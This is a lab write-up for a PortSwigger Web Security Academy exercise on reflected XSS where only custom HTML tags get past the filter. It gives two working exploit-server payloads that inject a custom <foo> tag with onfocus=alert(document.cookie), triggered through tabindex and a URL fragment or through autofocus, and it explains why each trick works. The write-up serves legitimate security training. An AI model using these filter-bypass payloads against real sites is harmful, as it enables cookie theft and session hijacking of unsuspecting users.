# [Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

## Lab

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically `alerts document.cookie`.

## Analysis

most tags are blocked like [lab 17](./17.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked.md) except custom one.

## Solutions

1. exploit server:

    ```js
    <script>
    location = 'https://0a5c00a5037a68efc0d84a80009d001f.web-security-academy.net/?search=%3Cfoo+id%3Dtargetme+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E%3C%2Ffoo%3E#targetme'
    </script>
    ```

    - `foo`: custom tag
    - `#`: fragment identifier
    - `tabindex=1`: which element has this attribute will trigger `onfocus` if fragment identifier point to `id`

2. exploit server:

    ```js
    <script>
    location = 'https://0a9a00b4044b2491c1a9ee3e008b00a4.web-security-academy.net/?search=%3Cfoo+autofocus+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E%3C%2Ffoo%3E'
    </script>
    ```

    - `foo`: custom tag
    - `autofocus` triggers `onfocus`

lab solved
